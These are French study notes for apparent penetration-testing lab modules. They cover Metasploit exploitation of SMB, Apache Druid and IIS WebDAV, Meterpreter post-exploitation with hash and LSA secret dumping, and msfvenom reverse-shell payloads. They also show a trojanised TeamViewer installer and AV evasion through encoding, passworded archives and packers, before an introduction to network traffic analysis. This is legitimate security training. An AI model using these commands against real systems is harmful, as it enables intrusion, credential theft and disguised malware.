<p><strong>Objectif :</strong> Utiliser Metasploit pour exploiter une vulnérabilité SMB sur une machine Windows, obtenir un shell SYSTEM, trouver <code>flag.txt</code> sur le bureau d’Administrator.</p>
<p><strong>Approche générale (haut niveau) :</strong></p>
<p><strong>Enumeration</strong></p>
<ul>
<li>Scanner la cible (Nmap) pour identifier un SMB vulnérable (port 445 + Windows 7/10).</li>
</ul>
<p><strong>Recherche du module</strong></p>
<ul>
<li>Dans <code>msfconsole</code> : <code>search ms17_010</code> ou <code>search eternalromance</code>.</li>
<li>Choisir un module approprié (par ex. un module SMB/Psexec lié à MS17-010).</li>
</ul>
<p><strong>Configuration</strong></p>
<ul>
<li><code>use</code> sur le module choisi.</li>
<li><code>show options</code> pour voir <code>RHOSTS</code>, <code>RPORT</code>, etc.</li>
<li><code>set RHOSTS &lt;IP_cible&gt;</code></li>
<li>Configurer <code>LHOST</code> avec ton IP VPN HTB.</li>
<li>Laisser le payload par défaut ou mettre un <code>meterpreter/reverse_tcp</code>.</li>
</ul>
<p><strong>Exploitation</strong></p>
<ul>
<li><code>run</code> / <code>exploit</code>.</li>
<li>Tu obtiens un shell / une session (cmd ou Meterpreter) avec les privilèges SYSTEM.</li>
</ul>
<ol>
<li><strong>Récupération du flag</strong>
<ul>
<li>Naviguer jusqu’à <code>C:\Users\Administrator\Desktop\flag.txt</code>.</li>
<li>Lire le fichier.</li>
</ul></li>
</ol>
<h3>Lab 2 – Exploitation d’Apache Druid</h3>
<p><strong>Objectif :</strong> Exploiter un service Apache Druid vulnérable via Metasploit, puis récupérer un <code>flag.txt</code>.</p>
<p><strong>Approche (conceptuelle) :</strong></p>
<p><strong>Enumeration</strong></p>
<ul>
<li>Scanner la machine, repérer un service Apache Druid (port HTTP + bannières, etc.).</li>
</ul>
<p><strong>Recherche du module MSF</strong></p>
<ul>
<li><code>search druid</code> ou via <code>search cve:...</code> si la vulnérabilité est connue.</li>
<li>Choisir un module <code>exploit/</code> approprié pour Apache Druid.</li>
</ul>
<p><strong>Configuration</strong></p>
<ul>
<li><code>use</code> sur le module.</li>
<li><code>show options</code> pour voir les paramètres (RHOSTS, RPORT, éventuellement PATH, etc.).</li>
<li><code>set RHOSTS &lt;IP_cible&gt;</code></li>
<li>Configurer un payload adapté (souvent un <code>meterpreter</code> ou <code>shell</code> selon le module).</li>
</ul>
<p><strong>Exploitation</strong></p>
<ul>
<li><code>run</code> / <code>exploit</code> pour obtenir un shell sur la machine cible.</li>
</ul>
<p><strong>Récupération du flag</strong></p>
<ul>
<li>Rechercher <code>flag.txt</code> sur la machine (<code>find</code> / <code>search</code> ou navigation manuelle).</li>
<li>Lire le contenu du fichier.</li>
</ul>
<h2>Petit mémo Metasploit (cheat sheet rapide)</h2>
<div class="codehilite"><pre><code># Lancer le framework
msfconsole -q

# Rechercher un module
search &lt;mot_clé&gt;
search type:exploit platform:windows cve:2017 rank:excellent

# Sélectionner un module
use &lt;index&gt;           # depuis search
use exploit/...       # chemin complet

# Voir options, targets, payloads
show options
show targets
show payloads
info                  # doc détaillée du module

# Paramétrage classique
set RHOSTS &lt;IP&gt;
set RPORT &lt;PORT&gt;
set LHOST &lt;IP_local&gt;
set LPORT 4444
setg LHOST &lt;IP&gt;       # global
setg RHOSTS &lt;IP&gt;      # global

# Choisir un payload
set payload &lt;nom_complet_payload&gt;

# Lancer l’exploit
run
exploit

# Sessions
sessions              # liste
sessions -i &lt;id&gt;      # interagir
background            # mettre une session en arrière-plan

# DB
db_status
db_nmap &lt;options&gt; &lt;IP&gt;
hosts
services
workspace -a &lt;name&gt;
workspace &lt;name&gt;
db_export -f xml backup.xml

</code></pre></div>
<h3>Sessions</h3>
<ul>
<li><p><strong>Qu’est-ce qu’une session ?</strong></p>
<p>Un canal de communication persistant avec une cible (par ex. un shell Meterpreter ou un autre payload).</p></li>
<li><p><strong>Mettre une session en arrière-plan</strong></p>
<ul>
<li><code>CTRL + Z</code> <strong>ou</strong> <code>background</code> (depuis Meterpreter).</li>
<li>La session continue de tourner ; tu es simplement renvoyé vers <code>msf6 &gt;</code>.</li>
</ul></li>
<li><p><strong>Lister les sessions</strong></p>
<div class="codehilite">
<pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span>sessions
</code></pre>
</div></li>
<li><p><strong>Interagir avec une session spécifique</strong></p>
<div class="codehilite">
<pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span>sessions<span class="w"> </span>-i<span class="w"> </span><span class="m">1</span>
meterpreter<span class="w"> </span>&gt;
</code></pre>
</div></li>
<li><p><strong>Workflow classique</strong></p>
<ol>
<li>Exploiter la cible → obtenir un Meterpreter.</li>
<li>Mettre la session en arrière-plan avec <code>background</code>.</li>
<li><code>use</code> un module <strong>post</strong>.</li>
<li>Définir l’option <code>SESSION</code> avec l’ID de la session.</li>
<li><code>run</code>.</li>
</ol>
<p>Exemple :</p>
<div class="codehilite">
<pre><span></span><code>meterpreter<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">bg</span>
msf6<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>post/multi/recon/local_exploit_suggester
msf6<span class="w"> </span>post<span class="o">(</span>...<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>SESSION<span class="w"> </span><span class="m">1</span>
msf6<span class="w"> </span>post<span class="o">(</span>...<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>run
</code></pre>
</div></li>
</ul>
<h3>Jobs</h3>
<ul>
<li>Les jobs = modules qui tournent en arrière-plan (comme des handlers / listeners).</li>
<li><p><strong>Voir l’aide des jobs</strong></p>
<div class="codehilite">
<pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">jobs</span><span class="w"> </span>-h
</code></pre>
</div></li>
<li><p><strong>Lancer un exploit en tant que job</strong></p>
<div class="codehilite">
<pre><span></span><code>msf6<span class="w"> </span>exploit<span class="o">(</span>multi/handler<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>exploit<span class="w"> </span>-j
</code></pre>
</div></li>
<li><p><strong>Lister les jobs</strong></p>
<div class="codehilite">
<pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">jobs</span><span class="w"> </span>-l
</code></pre>
</div></li>
<li><p><strong>Tuer un job spécifique</strong></p>
<div class="codehilite">
<pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">jobs</span><span class="w"> </span>-k<span class="w"> </span><span class="m">0</span>
</code></pre>
</div></li>
<li><p><strong>Tuer tous les jobs</strong></p>
<div class="codehilite">
<pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">jobs</span><span class="w"> </span>-K
</code></pre>
</div></li>
<li><p>Quand utiliser les jobs :</p>
<ul>
<li>Tu as besoin d’un listener qui tourne en continu (multi/handler).</li>
<li>Un port est « occupé » parce qu’un handler tourne encore en arrière-plan.</li>
</ul></li>
</ul>
<h2>Notions essentielles sur Meterpreter</h2>
<h3>Ce qu’est Meterpreter</h3>
<ul>
<li>Payload avancé en mémoire (la « boîte à outils suisse » du pentest).</li>
<li>Réside en RAM, aucun fichier sur le disque → furtif et difficile à analyser en forensic.</li>
<li>Communications chiffrées (AES) dans MSF6.</li>
<li>Extensible avec des modules &amp; extensions (<code>stdapi</code>, <code>priv</code>, etc.).</li>
</ul>
<h3>Commandes de base essentielles</h3>
<p>Depuis <code>meterpreter &gt; help</code> (les plus utiles) :</p>
<ul>
<li><code>background</code> / <code>bg</code> – met la session en arrière-plan.</li>
<li><code>sessions</code> – bascule entre les différentes sessions.</li>
<li><code>getuid</code> – affiche l’utilisateur courant.</li>
<li><code>ps</code> – liste les processus.</li>
<li><code>migrate</code> – migre vers un autre processus.</li>
<li><code>steal_token PID</code> – usurpe un jeton (token) d’un autre processus.</li>
<li><code>hashdump</code> – dump les hashes locaux du SAM.</li>
<li><code>lsa_dump_sam</code> / <code>lsa_dump_secrets</code> – récupère des identifiants plus profonds (nécessite SYSTEM).</li>
<li><code>run</code> – lance des scripts Meterpreter / modules post.</li>
</ul>
<h3>Exemple de chaîne d’attaque (IIS WebDAV / type Granny)</h3>
<p><strong>Scanner &amp; identifier le service</strong></p>
<div class="codehilite">
<pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span>db_nmap<span class="w"> </span>-sV<span class="w"> </span>-p-<span class="w"> </span>-T5<span class="w"> </span>-A<span class="w"> </span><span class="m">10</span>.10.10.15
</code></pre>
</div>
<p>Résultat : <code>Microsoft IIS httpd 6.0</code> sur le port 80, WebDAV activé.</p>
<p><strong>Recherche de l’exploit</strong></p>
<div class="codehilite">
<pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span>search<span class="w"> </span>iis_webdav_upload_asp
msf6<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>exploit/windows/iis/iis_webdav_upload_asp
msf6<span class="w"> </span>exploit<span class="o">(</span>...<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">10</span>.10.10.15
msf6<span class="w"> </span>exploit<span class="o">(</span>...<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span>tun0
msf6<span class="w"> </span>exploit<span class="o">(</span>...<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>run
</code></pre>
</div>
<p><strong>Obtenir Meterpreter, puis tester <code>getuid</code></strong></p>
<ul>
<li>Si <code>getuid</code> échoue : <code>Operation failed: Access is denied</code>.</li>
<li>Utiliser <code>ps</code> puis <code>steal_token</code> sur un processus qui tourne sous <code>NETWORK SERVICE</code>, etc.</li>
<li>Ensuite <code>getuid</code> → <code>NT AUTHORITY\NETWORK SERVICE</code>.</li>
</ul>
<p><strong>Élévation de privilèges avec Local Exploit Suggester</strong></p>
<div class="codehilite">
<pre><span></span><code>meterpreter<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">bg</span>
msf6<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>post/multi/recon/local_exploit_suggester
msf6<span class="w"> </span>post<span class="o">(</span>...<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>SESSION<span class="w"> </span><span class="m">1</span>
msf6<span class="w"> </span>post<span class="o">(</span>...<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>run
</code></pre>
</div>
<p>Il suggère par exemple :</p>
<ul>
<li><code>exploit/windows/local/ms15_051_client_copy_image</code> etc.</li>
</ul>
<p><strong>Lancer l’exploit local choisi</strong></p>
<div class="codehilite">
<pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>exploit/windows/local/ms15_051_client_copy_image
msf6<span class="w"> </span>exploit<span class="o">(</span>...<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>SESSION<span class="w"> </span><span class="m">1</span>
msf6<span class="w"> </span>exploit<span class="o">(</span>...<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span>tun0
msf6<span class="w"> </span>exploit<span class="o">(</span>...<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>run
meterpreter<span class="w"> </span>&gt;<span class="w"> </span>getuid
Server<span class="w"> </span>username:<span class="w"> </span>NT<span class="w"> </span>AUTHORITY<span class="se">\S</span>YSTEM
</code></pre>
</div>
<p><strong>Exemples de post-exploitation</strong></p>
<ul>
<li><code>hashdump</code></li>
<li><code>lsa_dump_sam</code></li>
<li><code>lsa_dump_secrets</code></li>
</ul>
<h2>Écriture &amp; import de modules Metasploit</h2>
<h3>Installation de modules tiers (Exploit-DB / searchsploit)</h3>
<p><strong>Trouver des exploits au format Metasploit</strong></p>
<div class="codehilite">
<pre><span></span><code>searchsploit<span class="w"> </span>nagios3
searchsploit<span class="w"> </span>-t<span class="w"> </span>Nagios3<span class="w"> </span>--exclude<span class="o">=</span><span class="s2">".py"</span>
</code></pre>
</div>
<p>Chercher les entrées <code>.rb</code> qui mentionnent Metasploit.</p>
<p><strong>Répertoires de modules Metasploit</strong></p>
<p>Chemin principal du framework :</p>
<div class="codehilite">
<pre><span></span><code>/usr/share/metasploit-framework/
</code></pre>
</div>
<p>Données locales MSF :</p>
<div class="codehilite">
<pre><span></span><code>~/.msf4/
</code></pre>
</div>
<p><strong>Placer le module dans le bon répertoire</strong></p>
<p>Exemple :</p>
<div class="codehilite">
<pre><span></span><code>cp<span class="w"> </span>~/Downloads/9861.rb<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>/usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
</code></pre>
</div>
<p>Utiliser des noms en <em>snake_case</em> :</p>
<ul>
<li>✅ <code>nagios3_command_injection.rb</code></li>
<li>❌ <code>nagios3-command-injection.rb</code></li>
</ul>
<p><strong>Charger les nouveaux modules</strong></p>
<p>Option A (lancer msfconsole avec un chemin supplémentaire) :</p>
<div class="codehilite">
<pre><span></span><code>msfconsole<span class="w"> </span>-m<span class="w"> </span>/usr/share/metasploit-framework/modules/
</code></pre>
</div>
<p>Option B (depuis msfconsole) :</p>
<div class="codehilite">
<pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span>loadpath<span class="w"> </span>/usr/share/metasploit-framework/modules/
<span class="c1"># ou</span>
msf6<span class="w"> </span>&gt;<span class="w"> </span>reload_all
</code></pre>
</div>
<p><strong>Utiliser le module</strong></p>
<div class="codehilite">
<pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span>search<span class="w"> </span>nagios3_command_injection
msf6<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>exploit/unix/webapp/nagios3_command_injection
msf6<span class="w"> </span>exploit<span class="o">(</span>...<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>show<span class="w"> </span>options
</code></pre>
</div>
<h3>Portage d’exploits vers Metasploit</h3>
<ul>
<li><p>Les modules sont des classes Ruby :</p>
<div class="codehilite">
<pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">MetasploitModule</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
<span class="w">  </span><span class="no">Rank</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="no">ExcellentRanking</span>

<span class="w">  </span><span class="kp">include</span><span class="w"> </span><span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">HttpClient</span>
<span class="w">  </span><span class="kp">include</span><span class="w"> </span><span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">PhpEXE</span>
<span class="w">  </span><span class="kp">include</span><span class="w"> </span><span class="no">Msf</span><span class="o">::</span><span class="no">Auxiliary</span><span class="o">::</span><span class="no">Report</span>
</code></pre>
</div></li>
<li><p><strong>Section d’info :</strong></p>
<ul>
<li><code>Name</code>, <code>Description</code>, <code>Author</code>, <code>References</code>, <code>Platform</code>, <code>Arch</code>, <code>Targets</code>, <code>DisclosureDate</code>, etc.</li>
</ul></li>
<li><p><strong>Options :</strong></p>
<div class="codehilite">
<pre><span></span><code><span class="n">register_options</span><span class="p">(</span>
<span class="w">  </span><span class="o">[</span>
<span class="w">    </span><span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">'TARGETURI'</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="kp">true</span><span class="p">,</span><span class="w"> </span><span class="s1">'The base path for Bludit'</span><span class="p">,</span><span class="w"> </span><span class="s1">'/'</span><span class="o">]</span><span class="p">),</span>
<span class="w">    </span><span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">'BLUDITUSER'</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="kp">true</span><span class="p">,</span><span class="w"> </span><span class="s1">'The username for Bludit'</span><span class="o">]</span><span class="p">),</span>
<span class="w">    </span><span class="no">OptPath</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">'PASSWORDS'</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="kp">true</span><span class="p">,</span><span class="w"> </span><span class="s1">'The list of passwords'</span><span class="p">,</span>
<span class="w">            </span><span class="no">File</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="no">Msf</span><span class="o">::</span><span class="no">Config</span><span class="o">.</span><span class="n">data_directory</span><span class="p">,</span><span class="w"> </span><span class="s2">"wordlists"</span><span class="p">,</span><span class="w"> </span><span class="s2">"passwords.txt"</span><span class="p">)</span><span class="w"> </span><span class="o">]</span><span class="p">)</span>
<span class="w">  </span><span class="o">]</span><span class="p">)</span>
</code></pre>
</div></li>
<li><p>Réutiliser un module existant similaire comme base, puis :</p>
<ul>
<li>Mettre à jour les métadonnées.</li>
<li>Remplacer la logique HTTP, les paramètres, etc.</li>
<li>Adapter pour utiliser les bons mixins MSF (HttpClient, PhpEXE, etc.).</li>
</ul></li>
</ul>
<h2>Bases de MSFVenom</h2>
<p>MSFVenom = générateur de payload + encodeur.</p>
<h3>Exemple : générer un payload Meterpreter ASPX</h3>
<div class="codehilite">
<pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.14.5<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">1337</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-f<span class="w"> </span>aspx<span class="w"> </span>&gt;<span class="w"> </span>reverse_shell.aspx
</code></pre>
</div>
<p>Ensuite :</p>
<ol>
<li>Uploader <code>reverse_shell.aspx</code> dans le répertoire web (via FTP, etc.).</li>
<li><p>Configurer le handler :</p>
<div class="codehilite">
<pre><span></span><code>msf6<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>exploit/multi/handler
msf6<span class="w"> </span>exploit<span class="o">(</span>multi/handler<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/meterpreter/reverse_tcp
msf6<span class="w"> </span>exploit<span class="o">(</span>multi/handler<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">10</span>.10.14.5
msf6<span class="w"> </span>exploit<span class="o">(</span>multi/handler<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">1337</span>
msf6<span class="w"> </span>exploit<span class="o">(</span>multi/handler<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>run
</code></pre>
</div></li>
<li><p>Visiter <code>http://target/reverse_shell.aspx</code> → session Meterpreter.</p></li>
</ol>
<h3>Local Exploit Suggester avec des shells MSFVenom</h3>
<p>Quand ton Meterpreter a peu de privilèges (ex : <code>IIS APPPOOL\Web</code>) :</p>
<ol>
<li><code>sysinfo</code> → identifier l’architecture (x86).</li>
<li><code>search local exploit suggester</code></li>
<li><code>use post/multi/recon/local_exploit_suggester</code></li>
<li><code>set SESSION &lt;id&gt;</code> → <code>run</code></li>
<li>Choisir un exploit local suggéré (ex : <code>ms10_015_kitrap0d</code>) et le lancer pour obtenir <code>NT AUTHORITY\SYSTEM</code>.</li>
</ol>
<h2>Évitement Firewall / IDS / AV (haut niveau)</h2>
<h3>Endpoint vs Périmètre</h3>
<ul>
<li><strong>Protection endpoint</strong> = AV, antimalware, firewall hôte, etc.</li>
<li><strong>Protection périmètre</strong> = firewalls, IDS/IPS, WAFs, etc., généralement à la périphérie du réseau / dans la DMZ.</li>
</ul>
<h3>Méthodes de détection</h3>
<ul>
<li>Basée sur les signatures.</li>
<li>Heuristique / détection d’anomalies.</li>
<li>Analyse de protocole avec état (stateful).</li>
<li>Supervision humaine / SOC.</li>
</ul>
<h3>Techniques d’évasion spécifiques à MSF</h3>
<p><strong>Communications chiffrées</strong></p>
<ul>
<li>Meterpreter dans MSF6 utilise AES pour le C2.</li>
<li>Plus difficile pour un IDS réseau de détecter les patterns de payload.</li>
</ul>
<p><strong>Templates d’exécutables avec msfvenom</strong></p>
<p>Exemple : backdoor d’un EXE légitime :</p>
<div class="codehilite">
<pre><span></span><code>msfvenom<span class="w"> </span>windows/x86/meterpreter_reverse_tcp<span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.14.2<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">8080</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-k<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-x<span class="w"> </span>~/Downloads/TeamViewer_Setup.exe<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-a<span class="w"> </span>x86<span class="w"> </span>--platform<span class="w"> </span>windows<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-i<span class="w"> </span><span class="m">5</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-o<span class="w"> </span>~/Desktop/TeamViewer_Setup.exe
</code></pre>
</div>
<ul>
<li><code>x</code> → utiliser un EXE existant comme template.</li>
<li><code>k</code> → conserver le fonctionnement normal du programme (lancer l’app + le payload).</li>
<li><code>e</code> et <code>i</code> → encodeur &amp; itérations (ex : Shikata Ga Nai).</li>
</ul>
<p><strong>Archives</strong></p>
<ul>
<li>Mettre un mot de passe sur les archives contenant les payloads → l’AV ne peut pas analyser le contenu directement.</li>
<li>Astuce de double archive :
<ul>
<li>Créer une archive du payload (avec mot de passe).</li>
<li>Retirer l’extension (ex : <code>.rar</code> → aucun suffixe).</li>
<li>Archiver à nouveau ce fichier avec un mot de passe.</li>
</ul></li>
<li>L’AV enregistre souvent juste « impossible à scanner » au lieu de marquer comme malware.</li>
</ul>
<p><strong>Packers</strong></p>
<ul>
<li>Compresser / packer les exécutables (UPX, Enigma Protector, MPRESS, etc.).</li>
<li>Rend les signatures statiques plus difficiles à utiliser.</li>
</ul>
<p><strong>Code d’exploit</strong></p>
<ul>
<li>Randomiser les patterns de buffer.</li>
<li>Éviter les gros NOP sleds évidents.</li>
<li>Tester les exploits &amp; payloads dans un labo avant de les utiliser sur des cibles réelles.</li>
</ul>
<h2>Mises à jour de Metasploit Framework (août 2020 → MSF6)</h2>
<p>Points clés :</p>
<ul>
<li>Les sessions de payload créées avec MSF5 ne sont pas compatibles avec MSF6 (mécanismes de comm différents).</li>
<li><strong>Fonctionnalités de génération :</strong>
<ul>
<li>Chiffrement de bout en bout pour Meterpreter (Windows, Python, Java, Mettle, PHP).</li>
<li>Support client SMBv3.</li>
<li>Nouvelle génération polymorphique de shellcode Windows.</li>
</ul></li>
<li><strong>Artefacts plus propres :</strong>
<ul>
<li>Les DLL Meterpreter résolvent les fonctions par ordinal (et non plus par nom).</li>
<li>Plus de chaîne en clair <code>ReflectiveLoader</code> dans les binaires.</li>
<li>Les IDs de commandes Meterpreter sont encodés en entiers.</li>
</ul></li>
<li><strong>Mimikatz → Kiwi</strong>
<ul>
<li>L’extension Mimikatz a été remplacée par <code>kiwi</code>. Charger Mimikatz revient désormais à charger Kiwi.</li>
</ul></li>
</ul>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Intro to Network Traffic Analysis</strong></summary><div class="indented"><h1>Intro to Network Traffic Analysis</h1>
<h2>Mini Write-Up en Français</h2>
<p>L’<strong>analyse de trafic réseau</strong> (Network Traffic Analysis – NTA) consiste à <strong>capturer et examiner</strong> les communications qui circulent sur un réseau afin de :</p>
<ul>
<li>Comprendre comment les systèmes échangent des données</li>
<li>Détecter des anomalies</li>
<li>Identifier des menaces de sécurité</li>
</ul>
<p>En connaissant le trafic “normal” de l’environnement, on peut repérer plus facilement :</p>
<ul>
<li>des comportements suspects (port scan, C2, exfiltration, etc.)</li>
<li>des erreurs réseau ou mauvaises configurations</li>
<li>des signes d’intrusion ou de malware</li>
</ul>
<h2>Pourquoi l’analyse de trafic est importante</h2>
<p>Un attaquant doit forcément <strong>communiquer</strong> avec le réseau pour :</p>
<ul>
<li>se déplacer latéralement,</li>
<li>exécuter des commandes (C2),</li>
<li>exfiltrer des données.</li>
</ul>
<p>Ces actions laissent des traces dans le trafic :</p>
<ul>
<li>ports / protocoles inhabituels</li>
<li>communications anormales entre hôtes</li>
<li>volumes ou fréquences de connexions étranges</li>
</ul>
<p>L’analyse de trafic permet :</p>
<ul>
<li>la <strong>détection de menaces</strong> (ransomware, exploits, scans, C2, etc.)</li>
<li>le <strong>dépannage réseau</strong> (latence, erreurs de protocole, pertes de paquets)</li>
<li>la <strong>forensique</strong> et le <strong>threat hunting</strong></li>
<li>le respect des <strong>exigences de sécurité</strong> et de conformité</li>
</ul>
<h2>Bases nécessaires pour faire de la NTA</h2>
<h3>Modèles OSI &amp; TCP/IP</h3>
<ul>
<li><strong>Modèle OSI</strong> : 7 couches, de <strong>Physique (1)</strong> à <strong>Application (7)</strong></li>
<li><strong>Modèle TCP/IP</strong> : 4 couches – <strong>Link, Internet, Transport, Application</strong></li>
</ul>
<p>Les données sont encapsulées couche par couche dans des <strong>PDU</strong> (Protocol Data Units) :</p>
<blockquote>
<p>trame Ethernet → paquet IP → segment TCP/UDP → données applicatives.</p>
</blockquote>
<p>Dans Wireshark, on voit ces couches dans l’ordre <strong>inverse</strong> de la désencapsulation :</p>
<p>Ethernet en haut, application en bas.</p>
<h3>Mécanismes d’adressage</h3>
<ul>
<li><strong>Adresse MAC</strong> (couche 2 / liaison)
<ul>
<li>48 bits en hexadécimal</li>
<li>Utilisée dans un domaine de broadcast (LAN)</li>
</ul></li>
<li><strong>IPv4</strong> (couche 3 / Internet)
<ul>
<li>32 bits, ex : <code>192.168.86.243</code></li>
</ul></li>
<li><strong>IPv6</strong>
<ul>
<li>128 bits, en hexadécimal</li>
<li>Types : <em>unicast, anycast, multicast</em> (pas de broadcast)</li>
</ul></li>
</ul>
<h3>Protocoles de transport : TCP vs UDP</h3>
<h3>TCP</h3>
<ul>
<li>Orienté connexion, fiable</li>
<li><strong>Three-way handshake</strong> : <code>SYN → SYN/ACK → ACK</code></li>
<li>Utilise des numéros de <strong>séquence</strong> et <strong>d’acquittement</strong> (ACK)</li>
<li>Fin de session propre : <code>FIN, ACK / FIN, ACK / ACK</code></li>
<li>Utilisé notamment par : <strong>HTTP(S), SSH, FTP, SMB, RDP</strong>, etc.</li>
</ul>
<h3>UDP</h3>
<ul>
<li>Sans connexion (fire and forget)</li>
<li>Pas de handshake, pas de garantie de livraison</li>
<li>Plus rapide, utile pour :
<ul>
<li><strong>DNS</strong>, streaming, VoIP, jeux en ligne, etc.</li>
</ul></li>
</ul>
<h2>Protocoles applicatifs importants</h2>
<h3>HTTP / HTTPS</h3>
<p><strong>HTTP</strong> :</p>
<ul>
<li>Protocole en clair, sans état (stateless)</li>
<li>Généralement sur le port TCP <strong>80</strong> (ou 8000, 8080, etc.)</li>
<li>Méthodes courantes :
<ul>
<li><code>GET</code>, <code>HEAD</code>, <code>POST</code>, <code>PUT</code>, <code>DELETE</code>, <code>OPTIONS</code>, <code>TRACE</code>, <code>CONNECT</code></li>
</ul></li>
</ul>
<p><strong>HTTPS</strong> :</p>
<ul>
<li>HTTP encapsulé dans <strong>TLS</strong></li>
<li>En général sur TCP <strong>443</strong></li>
<li>Négociation TLS via :
<ul>
<li><code>ClientHello / ServerHello</code>, choix des suites cryptographiques</li>
<li>Certificats X.509, génération de clés, établissement de la session chiffrée</li>
</ul></li>
<li><p>Dans les captures, après le handshake, on voit surtout :</p>
<p>→ <strong>TLS Application Data</strong> (contenu HTTP chiffré)</p></li>
</ul>
<h3>FTP</h3>
<ul>
<li>Protocole de <strong>transfert de fichiers</strong>, non chiffré</li>
<li>Utilise deux ports TCP :
<ul>
<li><strong>21</strong> : canal de commande</li>
<li><strong>20</strong> : canal de données</li>
</ul></li>
<li>Modes :
<ul>
<li><strong>Actif</strong></li>
<li><strong>Passif</strong> (plus pratique derrière NAT / pare-feux)</li>
</ul></li>
</ul>
<p>Commandes FTP classiques :</p>
<ul>
<li><code>USER</code>, <code>PASS</code>, <code>LIST</code>, <code>RETR</code>, <code>CWD</code>, <code>STOR</code>, <code>PASV</code>, <code>PORT</code>, <code>QUIT</code>, etc.</li>
</ul>
<p>En analyse réseau, FTP est intéressant pour :</p>
<ul>
<li>repérer des transferts de fichiers suspects</li>
<li>récupérer au vol des fichiers à partir d’un PCAP</li>
<li>voir des identifiants transmis en clair</li>
</ul>
<h3>SMB</h3>
<ul>
<li>Protocole de partage de fichiers et d’imprimantes, très répandu en environnement Windows</li>
<li>Utilise principalement le port <strong>TCP 445</strong></li>
<li>Permet aux attaquants :
<ul>
<li>mouvement latéral entre machines</li>
<li>accès à des partages réseau sensibles</li>
<li>abus de comptes/domain credentials</li>
</ul></li>
</ul>
<p>Signaux d’alerte :</p>
<ul>
<li>nombreuses tentatives d’authentification ratées</li>
<li>trafic SMB inhabituel entre postes utilisateurs (host-to-host)</li>
<li>accès à des partages ou chemins non habituels</li>
</ul>
<h2>Processus général d’analyse de trafic</h2>
